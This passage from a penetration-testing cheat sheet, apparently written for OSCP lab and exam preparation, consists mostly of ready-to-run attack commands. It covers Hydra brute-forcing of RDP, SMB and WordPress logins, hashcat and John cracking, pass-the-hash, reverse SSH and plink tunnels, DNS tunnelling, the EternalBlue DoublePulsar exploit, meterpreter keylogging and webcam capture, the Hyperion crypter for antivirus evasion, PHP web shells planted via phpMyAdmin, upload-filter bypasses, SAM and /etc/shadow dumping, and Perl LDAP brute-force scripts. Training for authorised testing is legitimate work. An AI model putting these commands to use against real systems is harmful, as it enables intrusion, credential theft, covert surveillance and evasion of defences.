  - `hydra -L ./webapp.txt -P ./webapp.txt $ip http-get /admin`

- Hydra attack Windows Remote Desktop with rockyou
  - `hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$ip`

- Hydra brute force SMB user with rockyou:
  - `hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt $ip smb`

- Hydra brute force a Wordpress admin login ( wpscan will do it too )
  - `hydra -l admin -P ./passwordlist.txt $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'`

### Password Hash Attacks

- Online Password Cracking  
      [*https://crackstation.net/*](https://crackstation.net/)
      [*http://finder.insidepro.com/*](http://finder.insidepro.com/)

#### Hashcat

Needed to install new drivers to get my GPU Cracking to work on the Kali linux VM and I also had to use the --force parameter.
- `apt-get install libhwloc-dev ocl-icd-dev ocl-icd-opencl-dev` and
- `apt-get install pocl-opencl-icd`
- Cracking Linux Hashes - /etc/shadow file

  ```text
  500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems
  3200 | bcrypt $2*$, Blowfish(Unix)                      | Operating-Systems
  7400 | sha256crypt $5$, SHA256(Unix)                    | Operating-Systems
  1800 | sha512crypt $6$, SHA512(Unix)                    | Operating-Systems
  ```

- Cracking Windows Hashes

  ```text
  3000 | LM                                               | Operating-Systems
  1000 | NTLM                                             | Operating-Systems
  ```

- Cracking Common Application Hashes

```text
  900 | MD4                                              | Raw Hash
    0 | MD5                                              | Raw Hash
 5100 | Half MD5                                         | Raw Hash
  100 | SHA1                                             | Raw Hash
10800 | SHA-384                                          | Raw Hash
 1400 | SHA-256                                          | Raw Hash
 1700 | SHA-512                                          | Raw Hash
```

- Create a .hash file with all the hashes you want to crack puthasheshere.hash:
  - `$1$O3JMY.Tw$AdLnLjQ/5jXF9.MTp3gHv/`
- Hashcat example cracking Linux md5crypt passwords $1$ using rockyou:
  - `hashcat --force -m 500 -a 0 -o found1.txt --remove puthasheshere.hash /usr/share/wordlists/rockyou.txt`
- Wordpress sample hash: `$P$B55D6LjfHDkINU5wF.v2BuuzO0/XPk/`
- Wordpress clear text: `test`
- Hashcat example cracking Wordpress passwords using rockyou:
  - `hashcat --force -m 400 -a 0 -o found1.txt --remove wphash.hash /usr/share/wordlists/rockyou.txt`
- Sample Hashes [*http://openwall.info/wiki/john/sample-hashes*](http://openwall.info/wiki/john/sample-hashes)
- Identify Hashes `hash-identifier`
- To crack linux hashes you must first unshadow them:  
  - `unshadow passwd-file.txt shadow-file.txt`
  - `unshadow passwd-file.txt shadow-file.txt > unshadowed.txt`
- John the Ripper - Password Hash Cracking
  - `john $ip.pwdump`
  - `john --wordlist=/usr/share/wordlists/rockyou.txt hashes`
  - `john --rules --wordlist=/usr/share/wordlists/rockyou.txt`
  - `john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt`
  - JTR forced descrypt cracking with wordlist  
        `john --format=descrypt --wordlist  /usr/share/wordlists/rockyou.txt hash.txt`
  - JTR forced descrypt brute force cracking  
        `john --format=descrypt hash --show`

#### Passing the Hash in Windows
- Use Metasploit to exploit one of the SMB servers in the labs.
  - Dump the password hashes and attempt a pass-the-hash attack against another system:  
    - `export SMBHASH=aad3b435b51404eeaad3b435b51404ee:6F403D3166024568403A94C3A6561896`
    - `pth-winexe -U administrator //$ip cmd`

## Networking, Pivoting and Tunneling

- Port Forwarding - accept traffic on a given IP address and port and
    redirect it to a different IP address and port
  - `apt-get install rinetd`
  - `cat /etc/rinetd.conf`

      ```shell
      # bindadress bindport connectaddress connectport
      w.x.y.z 53 a.b.c.d 80
      ```

- SSH Local Port Forwarding: supports bi-directional communication
    channels
  - `ssh <gateway> -L <local port to listen>:<remote host>:<remote port>`
- SSH Remote Port Forwarding: Suitable for popping a remote shell on
    an internal non routable network
  - `ssh <gateway> -R <remote port to bind>:<local host>:<local port>`
- SSH Dynamic Port Forwarding: create a SOCKS4 proxy on our local attacking box to tunnel ALL incoming traffic to ANY host in the DMZ network on ANY PORT
  - `ssh -D <local proxy port> -p <remote port> <target>`
- Proxychains - Perform nmap scan within a DMZ from an external computer
  - Create reverse SSH tunnel from Popped machine on :2222  
    - `ssh -f -N -T -R22222:localhost:22 yourpublichost.example.com`
    - `ssh -f -N -R 2222:<local host>:22 root@<remote host>`
  - Create a Dynamic application-level port forward on 8080 thru 2222  
    - `ssh -f -N -D <local host>:8080 -p 2222 hax0r@<remote host>`
  - Leverage the SSH SOCKS server to perform Nmap scan on network using proxy chains  
    - `proxychains nmap --top-ports=20 -sT -Pn $ip/24`
- HTTP Tunneling  
      `nc -vvn $ip 8888`
- Traffic Encapsulation - Bypassing deep packet inspection
  - http tunnel  
        On server side:  
        `sudo hts -F <server ip addr>:<port of your app> 80`
        On client side:  
        `sudo htc -P <my proxy.com:proxy port> -F <port of your app> <server ip addr>:80 stunnel`
- Tunnel Remote Desktop (RDP) from a Popped Windows machine to your network
  - Tunnel on port 22  
        `plink -l root -pw pass -R 3389:<localhost>:3389 <remote host>`
  - Port 22 blocked? Try port 80? or 443?  
        `plink -l root -pw 23847sd98sdf987sf98732 -R 3389:<local host>:3389 <remote host> -P80`
- Tunnel Remote Desktop (RDP) from a Popped Windows using HTTP Tunnel (bypass deep packet inspection)
  - Windows machine add required firewall rules without prompting the user
    - `netsh advfirewall firewall add rule name="httptunnel_client" dir=in action=allow program="httptunnel_client.exe" enable=yes`
    - `netsh advfirewall firewall add rule name="3000" dir=in action=allow protocol=TCP localport=3000`
    - `netsh advfirewall firewall add rule name="1080" dir=in action=allow protocol=TCP localport=1080`
    - `netsh advfirewall firewall add rule name="1079" dir=in action=allow protocol=TCP localport=1079`
  - Start the http tunnel client  
         `httptunnel_client.exe`
  - Create HTTP reverse shell by connecting to localhost port 3000  
        `plink -l root -pw 23847sd98sdf987sf98732 -R 3389:<local host>:3389 <remote host> -P 3000`
- VLAN Hopping

      ```shell
      git clone https://github.com/nccgroup/vlan-hopping.git
      chmod 700 frogger.sh
      ./frogger.sh
      ```

- VPN Hacking
  - Identify VPN servers:  
        `./udp-protocol-scanner.pl -p ike $ip`
  - Scan a range for VPN servers:  
        `./udp-protocol-scanner.pl -p ike -f ip.txt`
  - Use IKEForce to enumerate or dictionary attack VPN servers:  
    - `pip install pyip`  
    - `git clone https://github.com/SpiderLabs/ikeforce.git`
        Perform IKE VPN enumeration with IKEForce:  
        `./ikeforce.py TARGET-IP –e –w wordlists/groupnames.dic`
        Bruteforce IKE VPN using IKEForce:  
        `./ikeforce.py TARGET-IP -b -i groupid -u dan -k psk123 -w passwords.txt -s 1`
        Use ike-scan to capture the PSK hash:

        ```shell
        ike-scan  
        ike-scan TARGET-IP  
        ike-scan -A TARGET-IP  
        ike-scan -A TARGET-IP --id=myid -P TARGET-IP-key  
        ike-scan –M –A –n example_group -P hash-file.txt TARGET-IP
        ```

        Use psk-crack to crack the PSK hash

        ```shell
        psk-crack hash-file.txt  
        pskcrack  
        psk-crack -b 5 TARGET-IPkey  
        psk-crack -b 5 --charset="01233456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz" 192-168-207-134key  
        psk-crack -d /path/to/dictionary-file TARGET-IP-key
        ```

- PPTP Hacking
  - Identifying PPTP, it listens on TCP: 1723  
        NMAP PPTP Fingerprint:  
        `nmap –Pn -sV -p 1723 TARGET(S)`
        PPTP Dictionary Attack  
        `thc-pptp-bruter -u hansolo -W -w /usr/share/wordlists/nmap.lst`
- Port Forwarding/Redirection
- PuTTY Link tunnel - SSH Tunneling
  - Forward remote port to local address:  
         `plink.exe -P 22 -l root -pw "1337" -R 445:<local host>:445 <remote host>`
- SSH Pivoting
  - SSH pivoting from one network to another:  
        `ssh -D <local host>:1010 -p 22 user@<remote host>`
- DNS Tunneling
  - dnscat2 supports “download” and “upload” commands for getting iles (data and programs) to and from the target machine.
  - Attacking Machine Installation:

      ```shell
      apt-get update  
      apt-get -y install ruby-dev git make g++  
      gem install bundler  
      git clone https://github.com/iagox86/dnscat2.git  
      cd dnscat2/server  
      bundle install
      ```

  - Run dnscat2:

      ```shell
      ruby ./dnscat2.rb  
      dnscat2> New session established: 1422  
      dnscat2> session -i 1422
      ```

  - Target Machine:  
        [*https://downloads.skullsecurity.org/dnscat2/*](https://downloads.skullsecurity.org/dnscat2/)
        [*https://github.com/lukebaggett/dnscat2-powershell/*](https://github.com/lukebaggett/dnscat2-powershell/)
        `dnscat --host <dnscat server ip>`

## The Metasploit Framework

- See [*Metasploit Unleashed
    Course*](https://www.offensive-security.com/metasploit-unleashed/)
    in the Essentials

- Search for exploits using Metasploit GitHub framework source code:  
    [*https://github.com/rapid7/metasploit-framework*](https://github.com/rapid7/metasploit-framework)  
    Translate them for use on OSCP LAB or EXAM.
- Metasploit
  - MetaSploit requires Postfresql  
        `systemctl start postgresql`
  - To enable Postgresql on startup  
        `systemctl enable postgresql`
- MSF Syntax
  - Start metasploit  
        `msfconsole`

        `msfconsole -q`
  - Show help for command  
        `show -h`
  - Show Auxiliary modules  
        `show auxiliary`
  - Use a module  

        ```
        use auxiliary/scanner/snmp/snmp_enum  
        use auxiliary/scanner/http/webdav_scanner  
        use auxiliary/scanner/smb/smb_version  
        use auxiliary/scanner/ftp/ftp_login  
        use exploit/windows/pop3/seattlelab_pass
        ```
  - Show the basic information for a module  
        `info`
  - Show the configuration parameters for a module  
        `show options`
  - Set options for a module  

        ```shell
        set RHOSTS 192.168.1.1-254  
        set THREADS 10
        ```

  - Run the module  
        `run`
  - Execute an Exploit
        `exploit`
  - Search for a module  
        `search type:auxiliary login`
- Metasploit Database Access
  - Show all hosts discovered in the MSF database  
        `hosts`
  - Scan for hosts and store them in the MSF database  
        `db_nmap`
  - Search machines for specific ports in MSF database
        `services -p 443`
  - Leverage MSF database to scan SMB ports (auto-completed rhosts)  
        `services -p 443 --rhosts`
- Staged and Non-staged
  - Non-staged payload - is a payload that is sent in its entirety in one go
  - Staged - sent in two parts  Not have enough buffer space  Or need to bypass antivirus
- MS 17-010 - EternalBlue
  - You may find some boxes that are vulnerable to MS17-010 (AKA. EternalBlue).  Although, not offically part of the indended course, this exploit can be leveraged to gain SYSTEM level access to a Windows box.  I have never had much luck using the built in Metasploit EternalBlue module.  I found that the elevenpaths version works much more relabily. Here are the instructions to install it taken from the following YouTube video: [*https://www.youtube.com/watch?v=4OHLor9VaRI*](https://www.youtube.com/watch?v=4OHLor9VaRI)
    1. First step is to configure the Kali to work with wine 32bit

      ```shell
      dpkg --add-architecture i386 && apt-get update && apt-get install wine32
      rm -r ~/.wine
      wine cmd.exe
      exit
      ```

    2. Download the exploit repostory `https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit`
    3. Move the exploit to `/usr/share/metasploit-framework/modules/exploits/windows/smb` or `~/.msf4/modules/exploits/windows/smb`
    4. Start metasploit console

- I found that using spoolsv.exe as the PROCESSINJECT yielded results on OSCP boxes.

      ```shell
      use exploit/windows/smb/eternalblue_doublepulsar
      msf exploit(eternalblue_doublepulsar) > set RHOST 10.10.10.10
      RHOST => 10.10.10.10
      msf exploit(eternalblue_doublepulsar) > set PROCESSINJECT spoolsv.exe
      PROCESSINJECT => spoolsv.exe
      msf exploit(eternalblue_doublepulsar) > run
      ```

- Experimenting with Meterpreter
  - Get system information from Meterpreter Shell `sysinfo`
  - Get user id from Meterpreter Shell `getuid`
  - Search for a file `search -f *pass*.txt`
  - Upload a file `upload /usr/share/windows-binaries/nc.exe c:\\Users\\Offsec`
  - Download a file `download c:\\Windows\\system32\\calc.exe /tmp/calc.exe`
  - Invoke a command shell from Meterpreter Shell `shell`
  - Exit the meterpreter shell `exit`
- Metasploit Exploit Multi Handler
  - multi/handler to accept an incoming reverse_https_meterpreter

        ```shell
        payload  
        use exploit/multi/handler  
        set PAYLOAD windows/meterpreter/reverse_https  
        set LHOST $ip  
        set LPORT 443  
        exploit  
        [*] Started HTTPS reverse handler on https://$ip:443/
        ```

- Building Your Own MSF Module

      ```shell
      mkdir -p ~/.msf4/modules/exploits/linux/misc  
      cd ~/.msf4/modules/exploits/linux/misc  
      cp /usr/share/metasploitframework/modules/exploits/linux/misc/gld_postfix.rb ./crossfire.rb  
      nano crossfire.rb
      ```

- Post Exploitation with Metasploit - (available options depend on OS and Meterpreter Cababilities)
  - `download` Download a file or directory  
        `upload` Upload a file or directory  
        `portfwd` Forward a local port to a remote service  
        `route` View and modify the routing table  
        `keyscan_start` Start capturing keystrokes  
        `keyscan_stop` Stop capturing keystrokes  
        `screenshot` Grab a screenshot of the interactive desktop  
        `record_mic` Record audio from the default microphone for X seconds  
        `webcam_snap` Take a snapshot from the specified webcam  
        `getsystem` Attempt to elevate your privilege to that of local system.  
        `hashdump` Dumps the contents of the SAM database
- Meterpreter Post Exploitation Features
  - Create a Meterpreter background session `background`

## Bypassing Antivirus Software

- Crypting Known Malware with Software Protectors; One such open source crypter, called Hyperion  

    ```shell
    cp /usr/share/windows-binaries/Hyperion-1.0.zip  
    unzip Hyperion-1.0.zip  
    cd Hyperion-1.0/  
    i686-w64-mingw32-g++ Src/Crypter/*.cpp -o hyperion.exe  
    cp -p /usr/lib/gcc/i686-w64-mingw32/5.3-win32/libgcc_s_sjlj-1.dll .  
    cp -p /usr/lib/gcc/i686-w64-mingw32/5.3-win32/libstdc++-6.dll .  
    wine hyperion.exe ../backdoor.exe ../crypted.exe
    ```

## Windows Commands for Linux Users

<https://www.lemoda.net/windows/windows2unix/windows2unix.html>

### WAF - Web application firewall

One of the first things we should do when starting to poke on a website is see what WAF it has.
Identify the WAF
      `wafw00f <http://example.com>`

<http://securityidiots.com/Web-Pentest/WAF-Bypass/waf-bypass-guide-part-1.html>

### Common web-services

This is a list of some common web-services. The list is alphabetical.

- Cold Fusion
  - If you have found a cold fusion you are almost certainly struck gold. <http://www.slideshare.net/chrisgates/coldfusion-for-penetration-testers>
  - Determine version `example.com/CFIDE/adminapi/base.cfc?wsdl` It will say something like:

      ```HTML
      <!--WSDL created by ColdFusion version 8,0,0,176276-->
      Version 8
      FCKEDITOR
      ```

  - This works for version 8.0.1. So make sure to check the exact version.
      `use exploit/windows/http/coldfusion_fckeditor`
- LFI
    This will output the hash of the password.
    <http://server/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en>

- You can pass the hash.
    <http://www.slideshare.net/chrisgates/coldfusion-for-penetration-testers>
    <http://www.gnucitizen.org/blog/coldfusion-directory-traversal-faq-cve-2010-2861/>
- neo-security.xml and password.properties
- Drupal
  - droopescan
  - After log in, go to modules -> PHP Filter to enable php code execution ( Web Pages )
- Elastix
  - Full of vulnerabilities. The old versions at least.
    <http://example.com/vtigercrm/> default login is admin:admin
    You might be able to upload shell in profile-photo.
- Joomla
    `joomscan`

- Phpmyadmin
      Default credentials
      root <blank>
      pma <blank>
  - If you find a phpMyAdmin part of a site that does not have any authentication, or you have managed to bypass the authetication you can use it to upload a shell.
    - You go to: <http://192.168.1.101/phpmyadmin/>
    - Then click on SQL.
    - Run SQL query/queries on server "localhost":
    - From here we can just run a sql-query that creates a php script that works as a shell So we add the following query:

      `SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\shell.php"`

    - For linux:

      `SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/html/shell.php"`
    - The query is pretty self-explanatory. Now you just visit `192.168.1.101/shell.php?cmd=ipconfig` and you have a working web-shell. We can of course just write a superlong query with a better shell. But sometimes it is easier to just upload a simple web-shell, and from there download a better shell.
  - Download a better shell
  - On linux-machines we can use wget to download a more powerful shell.
    `?cmd=wget%20192.168.1.102/shell.php`
  - On windows-machines we can use **tftp**.

- Webdav
Okay so webdav is old as hell, and not used very often. It is pretty much like ftp. But you go through http to access it. So if you have webdav installed on a xamp-server you can access it like this: `cadaver 192.168.1.101/webdav`
Then sign in with username and password. The default username and passwords on xamp are:

> Username: wampp
> Password: xampp

Then use put and get to upload and download. With this you can of course upload a shell that gives you better access. If you are looking for live examples just google this: `inurl:webdav site:com`
Test if it is possible to upload and execute files with webdav.

`davtest -url <http://192.168.1.101> -directory demo_dir -rand aaaa_upfileP0C`

If you managed to gain access but is unable to execute code there is a workaround for that! So if webdav has prohibited the user to upload `.asp` code, and `pl` and whatever, we can do this:

- upload a file called `shell443.txt`, which of course is your `.asp` shell.
- And then you rename it to `shell443.asp;.jpg`. Now you visit the page in the browser and the asp code will run and return your shell.
- References <http://secureyes.net/nw/assets/Bypassing-IIS-6-Access-Restrictions.pdf>

- Webmin
      Webmin is a webgui to interact with the machine.
      The password to enter is the same as the passsword for the root user, and other users if they have that right. There are several vulnerabilites for it. It is run on port 10000.

- Wordpress
      `sudo wpscan -u <http://cybear32c.lab>`
      If you hit a 403. That is, the request if forbidden for some reason. Read more here: <https://en.wikipedia.org/wiki/HTTP_403>
      It could mean that the server is suspicious because you don't have a proper user-agent in your request, in wpscan you can solve this by inserting --random-agent. You can of course also define a specific agent if you want that. But random-agent is pretty convenient.

      `sudo wpscan -u <http://cybear32c.lab/> --random-agent`

- Bypass File Upload Filtering
      One common way to gain a shell is actually not really a vulnerability, but a feature! Often times it is possible to upload files to the webserver. This can be abused byt just uploading a reverse shell. The ability to upload shells are often hindered by filters that try to filter out files that could potentially be malicious. So that is what we have to bypass.
  - Rename it
      We can rename our shell and upload it as shell.php.jpg. It passed the filter and the file is executed as `php. php phtml, .php, .php3, .php4, .php5, and .inc`

      `asp asp, .aspx`

      `perl .pl, .pm, .cgi, .lib`

      `jsp .jsp, .jspx, .jsw, .jsv, and .jspf`

    - Coldfusion .cfm, .cfml, .cfc, .dbm
    - GIF89a; If they check the content. Basically you just add the text "GIF89a;" before you shell-code. So it would look something like this:

      ```shell
      GIF89a;
      <?
      system($_GET['cmd']);//or you can insert your complete shell code
      ?>
      ```

  - In image
    - `exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' lo.jpg`
  - References:
      <http://www.securityidiots.com/Web-Pentest/hacking-website-by-shell-uploading.html>
      <https://www.owasp.org/index.php/Unrestricted_File_Upload> <http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Webshells%20In%20PHP,%20ASP,%20JSP,%20Perl,%20And%20ColdFusion.pdf>

## Loot Windows

### Meterpreter

If you have a meterpreter shell you are able to do a lot of thing with very little effort. If you do not have a meterpreter-shell you can always create a exploit with msfvenom. An elf or exe or other format to upgrade your shell.

- Show help of all commands: `-h`
- Dump windows hashes for further analysis: `hashdump`
- Keylogger

      ```shell
      keysscan_start
      keyscan_dump
      keyscan_stop
      ```
- Mic and webcam commands

      ```shell
      record_mic     Record audio from the default microphone for X seconds
      webcam_chat    Start a video chat
      webcam_list    List webcams
      webcam_snap    Take a snapshot from the specified webcam
      webcam_stream  Play a video stream from the specified webcam
      ```

### Dumping passwords and hashes on windows

This most likely requires administrative rights, that's why the chapter is found here and not in priv-esc. Once you have a hash you can move on to the Password Cracking-chapter where we discuss different techniques of cracking hashes.

Windows stores passwords in SAM - Security Account Manager. Passwords are stored differently depending on the operating system. Up until (and including) Windows 2003 stored the passwords in LAN Manager (LM) and NT LAN Manager (NTLM). LM is incredibly insecure. From windows vista and on the system does not use LM, only NTLM. So it is a bit more secure.

LM and NTLM >= Windows 2003
NTLM > Windows vista

#### LM Hashes

LM hashes can be really easy to crack. The LM part in the example below is the first part.

Administrator:500:FA21A6D3CF(01B8BAAD3B435B51404EE:C294D192B82B6AA35C3DFCA81F1F59BC:::

- Example of NT

Administrator:500:NO PASSWORD*********************:BE134K40129560B46534340292AF4E72:::

- We can use crackstation or hashkiller to crack those hashes

`fgdump.exe`

We can use fgdump.exe (locate fgdump.exe on kali) to extract NTLM and LM Password hashes. Run it and there is a file called 127.0.0.1.pwndump where the hash is saved. Now you can try to brute force it.

### Windows Credencial Editor (WCE)

WCE can steal NTLM passwords from memory in cleartext! There are different versions of WCE, one for 32 bit systems and one for 64 bit. So make sure you have the right one.

- You can run it like this: `wce32.exe -w`
- Loot registry without tools
      This might be a better technique than using tools like wce and fgdump, since you don't have to upload any binaries. Get the registry:

      ```shell
      C:\> reg.exe save hklm\sam c:\windows\temp\sam.save
      C:\> reg.exe save hklm\security c:\windows\temp\security.save
      C:\> reg.exe save hklm\system c:\windows\temp\system.save
      ```

- The hashes can be extracted using `secretdump.py` or `pwdump`
- Pwdump 7: <http://www.tarasco.org/security/pwdump_7/>

### VNC

VNC require a specific password to log in to. So it is not the same password as the user password. If you have a meterpreter shell you can run the post exploit module to get the VNC password.

```shell
background
use post/windows/gather/credentials/vnc
set session X
exploit
```

## TCP-dump on windows

You can use meterpreter to easily take a tcp-dump, like this:

### Meterpreter

      ```shell
      run packetrecorder -li
      run packetrecorder -i 1

      #Search for interesting files

      #Meterpreter
      search -f *.txt
      search -f*.zip
      search -f *.doc
      search -f*.xls
      search -f config*
      search -f*.rar
      search -f *.docx
      search -f*.sql
      ```

## Recursive search
  
- `dir /s`
References: This is a great post <https://www.securusglobal.com/community/2013/12/20/dumping-windows-credentials/>
In older versions of windows there is a directory called repair, there you will find the backup of sam and system, we can copy then and use samdump2 to make a file containig those hashes and crack with john

## Loot Linux

Passwords and hashes

- First grab the passwd and shadow file.
  - `cat /etc/passwd`
  - `cat /etc/shadow`
- We can crack the password using john the ripper like this:
      `unshadow passwd shadow > unshadowed.txt`

      `john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt`
- Mail
  - `/var/mail`
  - `/var/spool/mail`

## Generate custom wordlist

Cracking passwords is good to know.
If we are able to do a dictionary-attack against a service it is important that we use a good dictionary. We can use e generic one. But we can also generate a custom wordlist based on certain criteria. That is what we are going to do in this chapter.
Remember people often use their birth dates, address, street address, pets, family members, etc. 

- Who is the target?
  - The target might be a specific company or person.

### Password rules

The service you want to hack might have specific password rules. Must contain certain characters, must be of certain length etc.
Combine a small/semi-small dict with a custom

- To combine two wordlists you can just do
  - `cat wordlist.txt >> wordlist2.txt`
- Create a custom wordlist
  - Html2dic - Build dictionary from html
- You can build a dictionary from a html-page.
      `curl <http://example.com> > example.txt`
  - Then run:
    `html2dic example.txt`
  - Then you should probably remove duplicates.
- Cewl - Spider and build dictionary
      `cewl -w createWordlist.txt <https://www.example.com>`
  - Add minimum password length:
      `cewl -w createWordlist.txt -m 6 <https://www.example.com>`

- Improve the custom wordlist
      As we all know few password are just simple words. Many use numbers and special characters. To improve our password list we can use john the ripper. We can input our own rules, or we can just use the standard john-the-ripper rules
      `john ---wordlist=wordlist.txt --rules --stdout > wordlist-modified.txt`

- References: <http://null-byte.wonderhowto.com/how-to/hack-like-pro-crack-passwords-part-4-creating-custom-wordlist-with-crunch-0156817/>

## Windows Pre-Compiled Binaries

Here is a repository of pre compiled binaries to use for exploit, instead of compile you can download and execute it.
`https://github.com/abatchy17/WindowsExploits`

## Active Directory and/or LDAP


### Username fuzzing in ldap

You need to install `sudo apt-get install -y libnet-ldap-perl` perl module to carryout this enumeration.

```perl
#!/usr/bin/env perl
use strict;
use warnings;
use Net::LDAP;

my $server   = "ldap.acme.com";
my $base     = "dc=ldap,dc=acme,dc=com";
my $filename = "/usr/share/seclists/Usernames/top-usernames-shortlist.txt";

open(my $fh, '<', $filename) or die $!;

my $ldap = Net::LDAP->new($server) or die $@;

while (my $word = <$fh>) {
    chomp($word);    
    
    my $search = $ldap->search(
        base    => $base,
        scope   => 'sub',
        filter  => '(&(uid='.$word.'))',
        attrs   => ['dn']
    );
    
    print "[+] Found valid login name $word\n"
if(defined($search->entry));
}
```

### Password enumeration against ldap

```perl

#!/usr/bin/env perl
use strict;
use warnings;
use Net::LDAP;my $server   = "ldap.acme.com";
my $user     = "twest";
my $base     = "dc=acme,dc=com";
my $filename = "wordlist.txt";open(my $fh, '<', $filename) or die $!;my $ldap = Net::LDAP->new($server) or die $@;my $search = $ldap->search(
    base    => $base,
    scope   => 'sub',
    filter  => '(&(uid='.$user.'))',
    attrs   => ['dn']
);if(defined($search->entry)) {    my $user_dn = $search->entry->dn;    print "[*] Searching for valid LDAP login for $user_dn...\n";    while (my $word = <$fh>) {
        chomp($word);        my $mesg = $ldap->bind($user_dn, password => $word);        if ($mesg and $mesg->code() == 0) {
            print "[+] Found valid login $user_dn / $word\n";
            exit;
        }
    }
} else {
    print "[x] $user is not a valid LDAP user...\n";
    exit;
}
print "[x] No valid LDAP logins found...\n";

```